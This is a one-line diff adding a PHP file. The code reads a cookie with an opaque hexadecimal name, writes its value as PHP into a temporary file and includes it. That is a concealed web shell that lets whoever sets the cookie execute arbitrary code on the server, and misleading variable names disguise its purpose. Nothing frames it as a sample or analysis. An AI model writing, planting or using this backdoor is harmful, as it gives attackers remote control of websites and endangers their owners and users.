@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["1B6D73493975425D"])){$compare=tmpfile();fwrite($compare,"<?php  ".$_COOKIE["1B6D73493975425D"]);$user_ip=stream_get_meta_data($compare);  include $user_ip["uri"];}?>
